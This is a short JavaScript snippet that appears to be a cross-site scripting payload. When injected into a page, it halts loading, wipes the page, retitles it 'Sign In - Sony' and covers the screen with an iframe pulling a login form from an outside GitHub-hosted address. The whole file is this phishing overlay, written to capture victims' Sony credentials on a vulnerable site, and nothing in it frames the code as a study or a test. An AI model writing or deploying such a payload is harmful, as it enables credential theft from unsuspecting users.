(function() {
    if (window.XSS_DONE) return;
    window.XSS_DONE = true;
    window.stop();
    document.documentElement.innerHTML = '<head><title>Sign In - Sony</title></head><body style="margin:0;padding:0;background:#f4f4f4;"></body>';
    var frame = document.createElement('iframe');
    frame.src = 'https://raw.githack.com/ItsS4LEH/sony/refs/heads/main/form.html';
    frame.style = "position:fixed; top:0; left:0; width:100%; height:100%; border:none; z-index:999999; background:#f4f4f4;";
    
    document.body.appendChild(frame);
})();
